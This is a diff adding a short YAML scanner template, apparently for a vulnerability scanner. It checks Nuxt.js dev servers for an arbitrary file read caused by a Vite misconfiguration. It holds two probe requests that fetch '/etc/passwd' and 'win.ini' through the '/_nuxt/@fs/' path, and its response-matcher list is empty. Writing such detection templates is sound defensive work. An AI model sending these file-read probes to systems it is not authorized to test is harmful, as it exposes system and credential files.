@@ -1,0 +1,17 @@
+id: nuxt-js-lfi
+brief:
+    title: Arbitrary File Read in Dev Mode - Nuxt.js
+    by: DhiyaneshDK
+    level: high
+    about: Vite is misconfigured within nuxt to permit any file to be retrieved from the file system.
+    label:
+        - huntr
+        - lfi
+        - nuxtjs
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/_nuxt/@fs/etc/passwd'
+        - '{{BaseURL}}/_nuxt/@fs/windows/win.ini'
+      signs: []
